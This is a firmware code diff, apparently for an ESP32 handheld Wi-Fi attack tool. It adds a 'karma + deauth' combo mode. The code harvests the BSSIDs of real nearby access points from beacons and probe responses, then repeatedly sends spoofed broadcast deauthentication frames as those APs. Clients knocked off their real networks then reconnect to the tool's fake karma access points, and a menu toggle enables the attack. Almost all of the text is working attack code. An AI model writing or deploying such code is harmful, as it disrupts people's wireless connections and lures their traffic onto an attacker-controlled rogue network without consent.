@@ -40,6 +40,7 @@
 #include <esp_event.h>
 #include <esp_bt.h>
 #include <esp_heap_caps.h>
+#include "wifi_deauth_frame.h"
 
 #define PROBE_MAX 32
 
@@ -58,9 +59,28 @@ static volatile uint32_t s_probe_total = 0;
 static volatile uint32_t s_resp_total  = 0;
 static volatile uint32_t s_resp_err    = 0;
 static volatile bool     s_karma_mode  = false;
+/* Karma + deauth combo: while karma is running, harvest the BSSIDs of
+ * REAL nearby APs from beacons/probe-responses the promiscuous callback
+ * already sees, then periodically broadcast-deauth spoofed as one of
+ * them. Clients get knocked off their real AP, rescan, and land on a
+ * karma beacon instead of waiting passively for that to happen. Starts
+ * OFF — this is an active attack, not a default. */
+static volatile bool     s_combo_mode  = false;
 static volatile uint8_t  s_cur_channel = 1;
 static portMUX_TYPE      s_probe_mux   = portMUX_INITIALIZER_UNLOCKED;
 static uint16_t          s_resp_seq    = 0;
+
+/* Real-AP harvest table for the combo. Small fixed size — this is just
+ * enough targets to round-robin broadcast deauth through, not a full
+ * scan result. Guarded by s_probe_mux like s_probe_count/s_probes. */
+#define REAL_AP_MAX 16
+struct real_ap_t {
+    uint8_t  bssid[6];
+    uint8_t  channel;
+    uint32_t last_seen;
+};
+static real_ap_t         s_real_aps[REAL_AP_MAX];
+static volatile int      s_real_ap_count = 0;
 
 /* Find index for (client, ssid). Returns -1 if not present.
  * NOTE: caller holds s_probe_mux. */
@@ -179,7 +199,52 @@ static const char *KARMA_SEED_SSIDS[] = {
 };
 #define KARMA_SEED_N (sizeof(KARMA_SEED_SSIDS)/sizeof(KARMA_SEED_SSIDS[0]))
 
+/* Record a REAL (non-karma) AP BSSID seen in a beacon or probe-response,
+ * for the karma+deauth combo. Dedups by BSSID; evicts oldest-seen on a
+ * full table. `channel` is s_cur_channel at capture time — promiscuous
+ * RX only sees frames on the channel the radio is currently tuned to,
+ * so this is exactly the channel the AP transmitted on, no DS-Parameter
+ * IE parsing needed.
+ *
+ * Filters out our OWN karma fakes: karma_ssid_bssid() always stamps
+ * byte[0]=0x02 (locally administered) and byte[1]=0x53 (cluster marker),
+ * so any BSSID matching both bytes is one of ours, not a real AP. The
+ * vestigial s_spoof_bssid also sets byte[0]=0x02 but its remaining bytes
+ * are random per-session and won't collide with the 0x53 marker, so this
+ * single check is sufficient — matches the task brief.
+ *
+ * Runs in WiFi task context (called from probe_cb). Guarded by
+ * s_probe_mux like s_probe_count/s_probes are. */
+static void harvest_real_ap(const uint8_t bssid[6], uint8_t channel)
+{
+    if (bssid[0] == 0x02 && bssid[1] == 0x53) return;  /* one of ours */
+
+    portENTER_CRITICAL(&s_probe_mux);
+    int idx = -1;
+    for (int i = 0; i < s_real_ap_count; ++i) {
+        if (memcmp(s_real_aps[i].bssid, bssid, 6) == 0) { idx = i; break; }
+    }
+    if (idx < 0) {
+        if (s_real_ap_count < REAL_AP_MAX) {
+            idx = s_real_ap_count++;
+        } else {
+            int oldest = 0;
+            for (int i = 1; i < REAL_AP_MAX; ++i)
+                if (s_real_aps[i].last_seen < s_real_aps[oldest].last_seen) oldest = i;
+            idx = oldest;
+        }
+        memcpy(s_real_aps[idx].bssid, bssid, 6);
+    }
+    s_real_aps[idx].channel   = channel;
+    s_real_aps[idx].last_seen = millis();
+    portEXIT_CRITICAL(&s_probe_mux);
+}
+
 /* Promiscuous RX callback. Called from WiFi driver task.
+ *
+ * For beacon/probe-response frames (subtype 0x8 / 0x5):
+ *   - harvest the transmitter's BSSID + current channel into the
+ *     real-AP table the karma+deauth combo round-robins through
  *
  * For probe-request frames (subtype 0x4):
  *   - extract client MAC + SSID
@@ -197,7 +262,14 @@ static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     if (pkt->rx_ctrl.sig_len < 26) return;
 
     uint8_t subtype = (p[0] >> 4) & 0xF;
-    if (subtype != 0x4) return;  /* probe request only */
+
+    if (subtype == 0x8 || subtype == 0x5) {  /* beacon or probe-response */
+        /* addr2 (SA/transmitter) at byte 10 == addr3 (BSSID) at byte 16
+         * for AP-originated frames; use BSSID directly. */
+        harvest_real_ap(p + 16, s_cur_channel);
+    }
+
+    if (subtype != 0x4) return;  /* rest of this function: probe request only */
 
     const uint8_t *client = p + 10;
     uint8_t tag_id  = p[24];
@@ -426,6 +498,10 @@ static void run_karma(void)
     s_resp_total  = 0;
     s_resp_err    = 0;
     s_karma_mode  = true;
+    s_combo_mode  = false;                 /* combo always starts OFF */
+    portENTER_CRITICAL(&s_probe_mux);
+    s_real_ap_count = 0;
+    portEXIT_CRITICAL(&s_probe_mux);
     s_resp_seq    = (uint16_t)(esp_random() & 0x0FFF);
 
     if (karma_wifi_init() != ESP_OK) {
@@ -435,11 +511,13 @@ static void run_karma(void)
     esp_wifi_set_promiscuous_rx_cb(probe_cb);
 
     ui_clear_body();
-    ui_draw_footer("TAB=chan  ENTER=spam  `=stop");
+    ui_draw_footer("TAB=chan ENT=spam HOLD=menu `=stop");
 
     int cursor = 0;
     uint32_t last_redraw = 0;
     uint32_t last_beacon = 0;
+    uint32_t last_combo_deauth = 0;
+    int combo_rr = 0;               /* round-robin index into s_real_aps */
     bool spam_on = true;
     int last_count  = -1;
     int last_cursor = -1;
@@ -458,7 +536,21 @@ static void run_karma(void)
                 last_cursor = cursor;
                 draw_probe_list(cursor);
             }
-            ui_draw_status(radio_name(), spam_on ? "karma+" : "karma");
+            /* Status line: base karma/karma+ state, plus combo state and
+             * harvested real-AP count so the operator can see the combo
+             * actually has targets (12 px status bar — keep it terse). */
+            if (s_combo_mode) {
+                int rcnt;
+                portENTER_CRITICAL(&s_probe_mux);
+                rcnt = s_real_ap_count;
+                portEXIT_CRITICAL(&s_probe_mux);
+                char st[24];
+                snprintf(st, sizeof(st), "%s cb%d",
+                         spam_on ? "karma+" : "karma", rcnt);
+                ui_draw_status(radio_name(), st);
+            } else {
+                ui_draw_status(radio_name(), spam_on ? "karma+" : "karma");
+            }
         }
 
         /* Background beacon spam. Pulls in clients that scan passively
@@ -499,6 +591,45 @@ static void run_karma(void)
             }
         }
 
+        /* Karma + deauth combo. Every ~600 ms, round-robin one harvested
+         * REAL AP and broadcast-deauth spoofed as it, on the channel karma
+         * is currently sitting on (only APs harvested on s_cur_channel are
+         * eligible — retuning to chase multi-channel targets would cost
+         * karma its own beacon airtime and RX window, not worth it for a
+         * feature meant to complement the beacon spam, not replace it).
+         * 600 ms (vs. beacon spam's 100 ms) keeps this a periodic nudge
+         * rather than a continuous flood: karma's beacons still get the
+         * vast majority of airtime, and clients that just got kicked need
+         * a moment to actually rescan before the next kick would matter.
+         * include_reverse=false halves the frame count (2 vs 4) — same
+         * broadcast-deauth tradeoff wifi_deauth_pair's own doc calls out,
+         * since AP->STA coverage alone is enough for a broadcast kick and
+         * this cadence is a guest on karma's airtime budget. Empty table
+         * = no-op, not a crash or busy loop. */
+        if (s_combo_mode && now - last_combo_deauth > 600) {
+            last_combo_deauth = now;
+            real_ap_t target;
+            bool have_target = false;
+            portENTER_CRITICAL(&s_probe_mux);
+            int n = s_real_ap_count;
+            for (int tries = 0; tries < n; ++tries) {
+                int idx = combo_rr % n;
+                combo_rr++;
+                if (s_real_aps[idx].channel == s_cur_channel) {
+                    target = s_real_aps[idx];
+                    have_target = true;
+                    break;
+                }
+            }
+            portEXIT_CRITICAL(&s_probe_mux);
+            if (have_target) {
+                static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+                uint16_t seq = s_resp_seq;
+                wifi_deauth_pair(BCAST, target.bssid, &seq, false);
+                s_resp_seq = seq & 0x0FFF;
+            }
+        }
+
         /* Active listening indicator every iteration so a quiet channel
          * (no probes yet) never reads as a frozen device. Self-throttles. */
         int lcnt;
@@ -518,17 +649,50 @@ static void run_karma(void)
         switch (k) {
         case ';': case PK_UP:   if (cursor > 0) cursor--; break;
         case '.': case PK_DOWN: if (cursor + 1 < count) cursor++; break;
-        /* PK_ACTIONS is the encoder long-press: on a keyboard-less board
-         * it is the ONLY way to reach a secondary action, and channel hop
-         * is what makes Karma work at all — clients probing on ch 6 never
-         * see a responder stuck on ch 1. */
-        case PK_TAB: case PK_ACTIONS:
-            /* Manual channel hop. Karma is channel-bound — clients
-             * probing on ch 6 won't see our response if we're sniffing
-             * on ch 1. Operator picks the channel based on target. */
+        /* TAB stays a direct channel hop for the Cardputer's physical
+         * keyboard — channel hop is what makes Karma work at all, clients
+         * probing on ch 6 never see a responder stuck on ch 1. */
+        case PK_TAB:
             s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
             esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
             break;
+        /* PK_ACTIONS is the encoder long-press: on a keyboard-less board
+         * (T-Embed) it is the ONLY way to reach secondary actions, so it
+         * opens the full action menu instead of hopping channel directly. */
+        case PK_ACTIONS: {
+            static const char *const acts[] = {
+                "Toggle beacon spam",
+                "Toggle deauth combo",
+                "Hop channel",
+                "Back",
+            };
+            int pick = ui_action_menu("KARMA ACTIONS", acts, 4);
+            switch (pick) {
+            case 0:
+                spam_on = !spam_on;
+                ui_toast(spam_on ? "karma beacon spam ON"
+                                 : "karma beacon spam OFF",
+                         spam_on ? T_GOOD : T_DIM, 700);
+                break;
+            case 1:
+                s_combo_mode = !s_combo_mode;
+                ui_toast(s_combo_mode ? "deauth combo ON"
+                                      : "deauth combo OFF",
+                         s_combo_mode ? T_BAD : T_DIM, 700);
+                break;
+            case 2:
+                s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
+                esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
+                break;
+            default:
+                break;  /* -1 (backed out) or 3 (Back) */
+            }
+            /* ui_action_menu paints over the body; force a full repaint
+             * of the probe/karma list on the next tick. */
+            last_count  = -1;
+            last_cursor = -1;
+            break;
+        }
         case PK_ENTER:
             spam_on = !spam_on;
             /* Bug 1 / repro 2026-06-06: previously ENTER toggled spam_on
@@ -542,6 +706,7 @@ static void run_karma(void)
     }
 
     s_karma_mode = false;
+    s_combo_mode = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_stop();
